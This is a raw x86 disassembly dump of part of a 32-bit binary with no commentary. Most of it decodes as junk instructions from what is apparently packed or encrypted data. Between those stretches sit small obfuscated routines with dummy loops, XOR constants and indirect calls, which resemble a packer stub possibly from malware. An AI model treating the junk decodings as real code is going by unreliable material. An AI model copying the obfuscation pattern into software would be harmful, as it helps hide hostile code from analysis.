  40841c:	xor    BYTE PTR [esi+0x2b],bl
  40841f:	or     al,0x45
  408421:	pop    ebx
  408422:	pop    esp
  408423:	mov    DWORD PTR ds:0x8aa76519,esi
  408429:	scas   al,BYTE PTR es:[edi]
  40842a:	xchg   edx,eax
  40842b:	pop    ebp
  40842c:	cld    
  40842d:	mov    eax,ds:0xc6bbc56a
  408432:	sub    BYTE PTR [ebx],dh
  408434:	pushf  
  408435:	push   esp
  408436:	inc    esp
  408437:	cld    
  408438:	dec    ebx
  408439:	jns    0x4083e0
  40843b:	jle    0x40844a
  40843d:	mov    bl,0xa2
  40843f:	push   eax
  408440:	lea    edx,[edi-0x14f084e4]
  408446:	ja     0x4083f0
  408448:	das    
  408449:	fisub  DWORD PTR ds:0xb30164ec
  40844f:	aam    0x38
  408451:	or     dh,BYTE PTR [ebx]
  408453:	xchg   esp,eax
  408454:	mov    ch,0xcc
  408456:	fwait
  408457:	mov    WORD PTR [ecx-0xf9001cf],ds
  40845d:	cmp    DWORD PTR [ebp+0x45],esp
  408460:	pop    ds
  408461:	gs hlt 
  408463:	lea    esp,[edx]
  408465:	bound  ecx,QWORD PTR [esi]
  408467:	in     eax,dx
  408468:	stos   BYTE PTR es:[edi],al
  408469:	or     al,0x81
  40846b:	pop    edi
  40846c:	jmp    0xc242:0x98fa960d
  408473:	xabort 0xb
  408476:	test   BYTE PTR [edx],bh
  408478:	ds xor al,0xd4
  40847b:	fisttp DWORD PTR [ebx+0x7d3796]
  408481:	cmp    edx,DWORD PTR [ecx+0xf]
  408484:	sub    BYTE PTR [ecx+0x18],0x0
  408488:	add    BYTE PTR [ebx-0x207e27ab],cl
  40848e:	lds    edx,FWORD PTR [esi+0x0]
  408491:	add    BYTE PTR [ebx+0x1d33fc7d],cl
  408497:	(bad)  
  408498:	sub    al,0x43
  40849a:	add    BYTE PTR [ebx],dh
  40849c:	rol    BYTE PTR [ecx+0x43431125],1
  4084a2:	add    BYTE PTR [eax],al
  4084a4:	add    BYTE PTR [eax],al
  4084a6:	add    cl,ch
  4084a8:	sldt   WORD PTR [eax]
  4084ab:	add    BYTE PTR [ebx],dh
  4084ad:	(bad)  [ebx]
  4084af:	sbb    eax,0x434311
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434311,ebx
  4084bb:	cmp    DWORD PTR ds:0x434311,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434311,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432b42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43431d
  4084ed:	add    DWORD PTR ds:0x432cca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434266,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43432d
  408507:	or     DWORD PTR ds:0x434319,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434325,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4325fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4325fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4325fc,edx
  408540:	cmp    DWORD PTR ds:0x4325fc,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x4325fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4328d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432cc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	xchg   ecx,eax
  408584:	addr16 je 0x408516
  408587:	test   al,0xd4
  408589:	jo     0x4085fb
  40858b:	imul   edi,DWORD PTR [edi+0x70],0x14c7fd70
  408592:	push   cs
  408593:	inc    esp
  408594:	arpl   WORD PTR [edi],si
  408596:	rcr    dl,1
  408598:	sub    eax,0xc236307c
  40859d:	dec    esi
  40859e:	gs xchg ecx,eax
  4085a0:	shr    DWORD PTR [ebp-0x722e087a],0x4
  4085a7:	loop   0x4085aa
  4085a9:	dec    edx
  4085aa:	xchg   edx,eax
  4085ab:	jmp    0xdc2f:0x6f427bb1
  4085b2:	js     0x408587
  4085b4:	pop    ecx
  4085b5:	xchg   BYTE PTR [ecx-0x12f660ca],dl
  4085bb:	push   esi
  4085bc:	and    eax,0xe2587a5
  4085c1:	fwait
  4085c2:	lea    ecx,[edx-0x7a]
  4085c5:	adc    BYTE PTR [ebx+ecx*4-0x6c3595b3],bh
  4085cc:	jmp    0xc459:0xc5b08b07
  4085d3:	loope  0x408587
  4085d5:	adc    DWORD PTR [eax],ebx
  4085d7:	and    dl,bl
  4085d9:	mov    bl,0xdb
  4085db:	inc    eax
  4085dc:	xchg   ebx,eax
  4085dd:	jp     0x4085ab
  4085df:	sbb    dh,bl
  4085e1:	or     dl,BYTE PTR [edi]
  4085e3:	call   0x2b7a88a0
  4085e8:	mov    ds:0x5f82f932,eax
  4085ed:	inc    edi
  4085ee:	cwde   
  4085ef:	add    DWORD PTR [ebx+0x44130bd2],0xe28de776
  4085f9:	imul   ecx,DWORD PTR [esi-0x62],0xa7802577
  408600:	inc    eax
  408601:	add    BYTE PTR [ecx+0x3f],bl
  408604:	sub    al,0xcd
  408606:	jecxz  0x40862f
  408608:	jmp    0xf8abfd60
  40860d:	push   eax
  40860e:	add    eax,0x56fa7f21
  408613:	clc    
  408614:	sbb    edx,0x211a8ae5
  40861a:	sbb    BYTE PTR [edx],al
  40861c:	(bad)  
  40861d:	mov    ebp,0x5a57e592
  408622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408623:	add    eax,DWORD PTR [ecx-0x34c8d0d1]
  408629:	and    al,0xc
  40862b:	cmp    al,0x10
  40862d:	adc    DWORD PTR [eax],esp
  40862f:	addr16 (bad) 
  408631:	push   ebx
  408632:	lock inc esi
  408634:	jecxz  0x408671
  408636:	jne    0x4085e7
  408638:	aaa    
  408639:	and    eax,0x83a4092b
  40863e:	mov    dh,0x9c
  408640:	sbb    BYTE PTR [ebx-0x3b6ec42e],dl
  408646:	mov    al,0xce
  408648:	push   esp
  408649:	daa    
  40864a:	rol    BYTE PTR [edx+0x14],cl
  40864d:	bound  ebx,QWORD PTR [esi-0x2743e01d]
  408653:	mov    esp,0xf8fdab6d
  408658:	mov    ecx,0x9278ff95
  40865d:	pop    ss
  40865e:	and    BYTE PTR [ebx+ebx*1-0x67e2c6e3],0x9d
  408666:	fld    DWORD PTR ds:0xcac8da3a
  40866c:	fcompp 
  40866e:	push   esp
  40866f:	push   ds
  408670:	ret    0x8aa6
  408673:	mov    ds:0xf7e5d214,al
  408678:	aaa    
  408679:	loope  0x40862f
  40867b:	mov    esp,0xc89b081f
  408680:	sahf   
  408681:	add    bh,0x67
  408684:	jnp    0x40865d
  408686:	(bad)  
  408687:	push   edx
  408688:	and    esi,DWORD PTR [edx]
  40868a:	mov    esi,edi
  40868c:	rcl    ebx,cl
  40868e:	xor    ebx,ebp
  408690:	hlt    
  408691:	dec    esp
  408692:	nop
  408693:	lahf   
  408694:	and    edi,DWORD PTR [edi]
  408696:	clc    
  408697:	stos   BYTE PTR es:[edi],al
  408698:	and    al,0x58
  40869a:	jo     0x408683
  40869c:	lds    eax,FWORD PTR [ebx+ecx*8]
  40869f:	jns    0x4086c4
  4086a1:	xchg   edi,eax
  4086a2:	or     eax,0x8ec44f11
  4086a7:	dec    DWORD PTR [esp+ecx*8-0x60]
  4086ab:	mov    ecx,0xfc5857
  4086b0:	sbb    DWORD PTR [ebx],ebx
  4086b2:	scas   al,BYTE PTR es:[edi]
  4086b3:	push   eax
  4086b4:	fcom   QWORD PTR cs:[ebp+0x45]
  4086b8:	retf   
  4086b9:	push   0x39
  4086bb:	bound  edx,QWORD PTR [ecx]
  4086bd:	push   eax
  4086be:	inc    edx
  4086bf:	xchg   edx,eax
  4086c0:	popf   
  4086c1:	rcl    DWORD PTR [esi],1
  4086c3:	test   al,0xd9
  4086c5:	jno    0x4086dd
  4086c7:	add    esi,DWORD PTR [eax-0x24]
  4086ca:	pop    es
  4086cb:	fwait
  4086cc:	adc    DWORD PTR [ebp+0x4c],edx
  4086cf:	adc    BYTE PTR [eax+0x1d],ch
  4086d2:	pop    ecx
  4086d3:	adc    eax,0xfbfddfd
  4086d8:	test   al,0x71
  4086da:	jo     0x4086ae
  4086dc:	loope  0x40870f
  4086de:	js     0x4086e3
  4086e0:	into   
  4086e1:	xchg   ebx,eax
  4086e2:	xor    DWORD PTR [esi+0x56],ebx
  4086e5:	fmul   QWORD PTR [edi]
  4086e7:	icebp  
  4086e8:	xchg   esp,eax
  4086e9:	xor    bh,BYTE PTR [ecx+ebx*1+0x62d13f49]
  4086f0:	inc    ebx
  4086f1:	or     bl,bh
  4086f3:	mov    ebp,0x37866ac7
  4086f8:	cmp    BYTE PTR [ecx-0x6b],dh
  4086fb:	sub    al,cl
  4086fd:	mov    dh,0x8f
  4086ff:	shl    DWORD PTR [eax],cl
  408701:	popf   
  408702:	mov    BYTE PTR [edx+0xdd42b22],ch
  408708:	push   edi
  408709:	ds pop esi
  40870b:	cmp    bl,ah
  40870d:	jp     0x4086b8
  40870f:	fsubr  DWORD PTR ds:0x2bf84f0c
  408715:	or     al,0x29
  408717:	into   
  408718:	cld    
  408719:	in     al,dx
  40871a:	outs   dx,BYTE PTR ds:[esi]
  40871b:	retf   
  40871c:	or     BYTE PTR [edx+0x1dea90e3],dl
  408722:	and    edi,DWORD PTR [ebx+ecx*1+0x5b]
  408726:	(bad)  
  408727:	and    al,cl
  408729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40872a:	inc    esp
  40872b:	add    dh,dl
  40872d:	cld    
  40872e:	sbb    al,0x81
  408730:	adc    eax,0x568cd5ff
  408735:	shr    BYTE PTR [ecx+0x3a],0xd3
  408739:	pop    ecx
  40873a:	pop    esi
  40873b:	mov    ds:0x529f9b58,eax
  408740:	adc    DWORD PTR [ebp-0x1d55e152],0x1e
  408747:	loopne 0x4086e4
  408749:	jb     0x4086f2
  40874b:	je     0x408756
  40874d:	int3   
  40874e:	xchg   ebp,eax
  40874f:	addr16 push ss
  408751:	cwde   
  408752:	cmc    
  408753:	inc    eax
  408754:	xchg   ebx,eax
  408755:	or     DWORD PTR [esi-0x39],ebp
  408758:	in     eax,dx
  408759:	call   0xdd0b5b11
  40875e:	xor    BYTE PTR [edx+0x41],bh
  408761:	adc    al,0x90
  408763:	sub    esp,DWORD PTR [ecx]
  408765:	or     al,0x10
  408767:	xchg   DWORD PTR [ebp+0xac72869],edx
  40876d:	dec    edi
  40876e:	or     eax,esi
  408770:	jbe    0x40871f
  408772:	test   BYTE PTR [edi],0xf5
  408775:	addr16 int3 
  408777:	sahf   
  408778:	xchg   edx,eax
  408779:	inc    ecx
  40877a:	test   al,0x71
  40877c:	push   0xffffff8d
  40877e:	xchg   al,bl
  408780:	shr    esi,1
  408782:	push   ds
  408783:	adc    cl,BYTE PTR [edi+ebx*2]
  408786:	mov    edx,DWORD PTR [ebp-0x4]
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43428a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43428a,0x43431d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434315
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43428e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434315,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434272,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432608,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434325,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432cd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43426a,0x13
  408823:	cmp    DWORD PTR ds:0x43426a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43426a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43277d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432bfa
  40884e:	cmp    DWORD PTR ds:0x43426a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43426a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43426a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43426a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43426a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx+0x3a1a524b]
  40892a:	mul    DWORD PTR [ecx+0x697070d2]
  408930:	jg     0x4089a2
  408932:	jo     0x4089ac
  408934:	or     dh,ah
  408936:	push   edi
  408937:	jl     0x4088e6
  408939:	cli    
  40893a:	or     ch,BYTE PTR [esi+0xf410c55]
  408940:	push   cs
  408941:	out    0xa8,al
  408943:	pusha  
  408944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408945:	mov    WORD PTR [ecx-0x7d766319],ss
  40894b:	iret   
  40894c:	test   dh,al
  40894e:	ret    0xda85
  408951:	jmp    0x408990
  408953:	sub    DWORD PTR [ebx+eiz*2],edx
  408956:	cmp    eax,0x73b2eaab
  40895b:	rcr    DWORD PTR [esi+0x159aee60],cl
  408961:	or     ecx,edi
  408963:	hlt    
  408964:	ret    
  408965:	pop    ss
  408966:	adc    eax,0xba206352
  40896b:	daa    
  40896c:	mov    ch,0xfb
  40896e:	mov    edi,0x2ceb67b6
  408973:	or     DWORD PTR [edx-0x59],0x4b7d8fb4
  40897a:	leave  
  40897b:	clc    
  40897c:	xchg   DWORD PTR [ebx],edx
  40897e:	mov    bl,0xbd
  408980:	(bad)  [edi+0x4302bc2]
  408986:	loop   0x408925
  408988:	inc    edx
  408989:	mov    dl,0x20
  40898b:	and    DWORD PTR [ebp-0x4aa600ae],eax
  408991:	mov    cl,0x83
  408993:	call   0x57e8df73
  408998:	jp     0x408a07
  40899a:	imul   esp,DWORD PTR [ebp+0x47],0xffffffc0
  40899e:	dec    ebp
  40899f:	sub    ebp,eax
  4089a1:	mov    edi,0xb3529076
  4089a6:	outs   dx,BYTE PTR ds:[esi]
  4089a7:	clc    
  4089a8:	in     al,dx
  4089a9:	mov    DWORD PTR [ebp+0x2a],esp
  4089ac:	sbb    al,0xdf
  4089ae:	cmp    eax,DWORD PTR [ebx+0x60]
  4089b1:	xor    eax,0x216a868a
  4089b6:	add    edx,ecx
  4089b8:	cdq    
  4089b9:	pop    ebp
  4089ba:	int    0xd4
  4089bc:	loopne 0x4089a6
  4089be:	dec    eax
  4089bf:	lods   eax,DWORD PTR ds:[esi]
  4089c0:	xor    bh,BYTE PTR [esi+0x2648c88]
  4089c6:	call   0x3aca:0xec594dc8
  4089cd:	dec    esi
  4089ce:	shl    bh,1
  4089d0:	daa    
  4089d1:	jecxz  0x408a41
  4089d3:	stos   BYTE PTR es:[edi],al
  4089d4:	jne    0x408974
  4089d6:	loope  0x4089f5
  4089d8:	in     al,0x69
  4089da:	pop    esp
  4089db:	mov    DWORD PTR [edi+0x18],esi
  4089de:	out    dx,eax
  4089df:	mov    ebx,0x51d7dbed
  4089e4:	lds    esp,FWORD PTR [edx]
  4089e6:	cmp    ah,dh
  4089e8:	(bad)
  4089ec:	mov    edi,0xae01c773
  4089f1:	bound  esp,QWORD PTR [ecx]
  4089f3:	popa   
  4089f4:	jns    0x4089ef
  4089f6:	jns    0x40897f
  4089f8:	mov    ecx,0xebb71972
  4089fd:	(bad)  
  4089fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089ff:	mov    ds:0x98e71cce,al
  408a04:	sub    cl,cl
  408a06:	jb     0x408a7b
  408a08:	mov    esp,0x29214ea2
  408a0d:	popa   
  408a0e:	in     eax,0x1f
  408a10:	and    al,0xd0
  408a12:	sbb    DWORD PTR [ebx-0x290747d1],edx
  408a18:	loopne 0x408a69
  408a1a:	dec    eax
  408a1b:	into   
  408a1c:	sbb    DWORD PTR [ecx],eax
  408a1e:	call   0xc00e:0xd1314091
  408a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a26:	jle    0x408aa5
  408a28:	mov    ah,0x53
  408a2a:	out    0x4b,eax
  408a2c:	es nop
  408a2e:	mov    esi,0x597f4e36
  408a34:	test   DWORD PTR [edi-0x6218e7d7],edi
  408a3a:	enter  0x7ea9,0x4c
  408a3e:	mov    dl,0x89
  408a40:	or     DWORD PTR [ebx-0x42701817],esi
  408a46:	ds retf 
  408a48:	jl     0x408a74
  408a4a:	les    esp,FWORD PTR ds:0xb819cb27
  408a50:	dec    esi
  408a51:	mov    al,0x2d
  408a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a54:	inc    eax
  408a55:	pop    edx
  408a56:	fwait
  408a57:	loope  0x408a32
  408a59:	lds    ebx,FWORD PTR [edi-0x18]
  408a5c:	dec    ecx
  408a5d:	jns    0x408a12
  408a5f:	mov    esp,0x8693bce6
  408a64:	sub    eax,0x7901f92e
  408a69:	push   ebp
  408a6a:	je     0x408a86
  408a6c:	mov    al,BYTE PTR ds:0xb6431d8d
  408a72:	mov    eax,ds:0x93a0b2df
  408a77:	out    0xe7,eax
  408a79:	popf   
  408a7a:	inc    ebp
  408a7b:	inc    ebx
  408a7c:	arpl   WORD PTR [ebx-0x647ac645],dx
  408a82:	pop    ds
  408a83:	jge    0x408a80
  408a85:	js     0x408a25
  408a87:	aas    
  408a88:	cmc    
  408a89:	dec    edx
  408a8a:	push   es
  408a8b:	add    eax,0x609f8de4
  408a90:	sub    eax,0x8241c1b9
  408a95:	scas   eax,DWORD PTR es:[edi]
  408a96:	retf   
  408a97:	nop
  408a98:	retf   
  408a99:	pushf  
  408a9a:	cld    
  408a9b:	sti    
  408a9c:	mov    ds:0x963d8feb,eax
  408aa1:	jmp    0xdd185094
  408aa6:	repnz in al,dx
  408aa8:	jo     0x408aa9
  408aaa:	adc    eax,0xaeb1b888
  408aaf:	dec    edi
  408ab0:	fisub  DWORD PTR [esi+0x1e]
  408ab3:	lock pop esi
  408ab5:	fdivp  st(7),st
  408ab7:	call   0xd0fb:0xbd8857b6
  408abe:	das    
  408abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ac0:	mov    dh,BYTE PTR [esi]
  408ac2:	inc    ebx
  408ac3:	inc    DWORD PTR [edx-0x98da33b]
  408ac9:	popa   
  408aca:	and    dh,ch
  408acc:	mov    bh,0x55
  408ace:	loopne 0x408aff
  408ad0:	adc    al,BYTE PTR [esi+0x1c991d21]
  408ad6:	cmp    eax,0xd3411c4c
  408adb:	loope  0x408ad7
  408add:	pop    ds
  408ade:	fild   DWORD PTR [ebp+0x1afc0a57]
  408ae4:	je     0x408ae4
  408ae6:	jecxz  0x408ac5
  408ae8:	daa    
  408ae9:	lahf   
  408aea:	pop    eax
  408aeb:	(bad)  
  408aec:	(bad)  
  408aed:	or     eax,0x93243711
  408af2:	loopne 0x408aa3
  408af4:	jmp    DWORD PTR [esi]
  408af6:	dec    eax
  408af7:	fdivr  QWORD PTR [esi-0x75]
  408afa:	shr    DWORD PTR [ecx+0x2],0x8c
  408afe:	test   DWORD PTR [ebp-0x7248dec6],0x506a7847
  408b08:	inc    eax
  408b09:	dec    esi
  408b0a:	outs   dx,BYTE PTR ds:[esi]
  408b0b:	or     al,bh
  408b0d:	hlt    
  408b0e:	mov    eax,ds:0x78cae62b
  408b13:	xor    al,0x64
  408b15:	das    
  408b16:	nop
  408b17:	add    cl,BYTE PTR [edi+edi*4-0x150f84cc]
  408b1e:	xchg   ebx,eax
  408b1f:	xor    BYTE PTR [esi-0x7674cbe9],al
  408b25:	rol    BYTE PTR [ebx-0x74018334],cl
  408b2b:	jge    0x408b29
  408b2d:	xor    edi,eax
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	call   0x70d0:0x9ac0044f
  408b98:	jo     0x408c03
  408b9a:	jg     0x408c0c
  408b9c:	jo     0x408b87
  408b9e:	cmp    eax,0xfda3f362
  408ba3:	rcr    BYTE PTR [ebp-0x493a898f],0x21
  408baa:	stos   DWORD PTR es:[edi],eax
  408bab:	adc    eax,0x8912699a
  408bb0:	cli    
  408bb1:	push   es
  408bb2:	xchg   edx,eax
  408bb3:	cwde   
  408bb4:	mov    ds:0xefb257d6,al
  408bb9:	mov    ds:0x6708b4ec,al
  408bbe:	dec    edi
  408bbf:	(bad)
  408bc4:	sub    edi,edi
  408bc6:	cmp    al,0xbe
  408bc8:	dec    eax
  408bc9:	mov    bl,0x92
  408bcb:	mov    edx,0xa6a80636
  408bd0:	inc    BYTE PTR [edx+0x44]
  408bd3:	ins    DWORD PTR es:[edi],dx
  408bd4:	std    
  408bd5:	ja     0x408c23
  408bd7:	loop   0x408c2f
  408bd9:	xchg   esi,eax
  408bda:	call   0xb2a:0xa06245ab
  408be1:	add    bl,dl
  408be3:	sub    eax,0xe3d14a93
  408be8:	jp     0x408b6b
  408bea:	not    BYTE PTR [edx]
  408bec:	xor    DWORD PTR [edi],ebp
  408bee:	sbb    eax,0x91fde91f
  408bf3:	icebp  
  408bf4:	push   esi
  408bf5:	cs mov eax,0x76b23e03
  408bfb:	or     eax,DWORD PTR [ecx+0x15946232]
  408c01:	push   ss
  408c02:	rcr    ecx,0x14
  408c05:	mov    edx,es
  408c07:	cmp    ecx,0x50
  408c0a:	sub    DWORD PTR [eax],esi
  408c0c:	leave  
  408c0d:	add    dl,bh
  408c0f:	xchg   ecx,eax
  408c10:	fidivr DWORD PTR [edi+0x37]
  408c13:	lods   al,BYTE PTR ds:[esi]
  408c14:	jns    0x408c58
  408c16:	test   eax,edx
  408c18:	jle    0x408c02
  408c1a:	sbb    DWORD PTR [ecx+0x2109fb65],esp
  408c20:	cmp    eax,0x3934f5ed
  408c25:	adc    DWORD PTR [edx+0x4eff2d8d],ebp
  408c2b:	jp     0x408bd5
  408c2d:	outs   dx,BYTE PTR ds:[esi]
  408c2e:	ds lahf 
  408c30:	mov    eax,ds:0xb817d33e
  408c35:	pop    ss
  408c36:	mov    gs,WORD PTR [eax+0x23]
  408c39:	leave  
  408c3a:	push   ebx
  408c3b:	add    dh,BYTE PTR [ebp+edi*4-0x31]
  408c3f:	inc    ecx
  408c40:	neg    BYTE PTR [ebp-0x13]
  408c43:	inc    edx
  408c44:	adc    DWORD PTR [ecx+ecx*1-0x34554925],ecx
  408c4b:	mov    dl,0x6c
  408c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c4e:	dec    ecx
  408c4f:	mov    ch,0xee
  408c51:	in     al,0xbb
  408c53:	fst    DWORD PTR [ebx]
  408c55:	jae    0x408c4d
  408c57:	lahf   
  408c58:	mov    al,ds:0x38908fc5
  408c5d:	mov    es,WORD PTR [edx-0x489a1437]
  408c63:	(bad)  
  408c64:	mov    dl,0xcf
  408c66:	js     0x408cd0
  408c68:	and    eax,0xbcc24019
  408c6d:	lock out 0x63,eax
  408c70:	or     eax,DWORD PTR [edi+0x2b]
  408c73:	xchg   ebx,eax
  408c74:	sub    BYTE PTR [edx],al
  408c76:	data16 into 
  408c78:	pop    esi
  408c79:	pop    esi
  408c7a:	xchg   edx,eax
  408c7b:	cmp    DWORD PTR [ecx-0x6f],0x59
  408c7f:	nop
  408c80:	in     al,0xb5
  408c82:	not    DWORD PTR [ebp-0x17]
  408c85:	js     0x408cd9
  408c87:	pop    ebp
  408c88:	imul   esp,esp,0xffffffe0
  408c8b:	or     BYTE PTR ds:0x155e2c93,dl
  408c91:	lock in eax,dx
  408c93:	cmp    BYTE PTR [ebp+0x43d0895d],cl
  408c99:	les    esi,FWORD PTR [edi-0x23b0f301]
  408c9f:	dec    esp
  408ca0:	loope  0x408cb1
  408ca2:	dec    ecx
  408ca3:	fbld   TBYTE PTR [ecx-0x2f9bd600]
  408ca9:	clc    
  408caa:	pop    esp
  408cab:	mov    bh,0x77
  408cad:	or     eax,0x1d67f350
  408cb2:	cmp    ecx,edx
  408cb4:	(bad)  
  408cb5:	call   0x345c:0xba1cbe6f
  408cbc:	fnstenv [edi+ebx*1]
  408cbf:	pusha  
  408cc0:	stc    
  408cc1:	clc    
  408cc2:	lock push cs
  408cc4:	mov    dl,0x7b
  408cc6:	push   edx
  408cc7:	sar    edx,1
  408cc9:	dec    ebx
  408cca:	or     al,0x6b
  408ccc:	loope  0x408d2f
  408cce:	sub    dl,BYTE PTR [ecx+0x51]
  408cd1:	push   eax
  408cd2:	popa   
  408cd3:	ins    DWORD PTR es:[edi],dx
  408cd4:	and    bh,ch
  408cd6:	adc    BYTE PTR [edx+eax*4+0x40],dh
  408cda:	sub    al,0x63
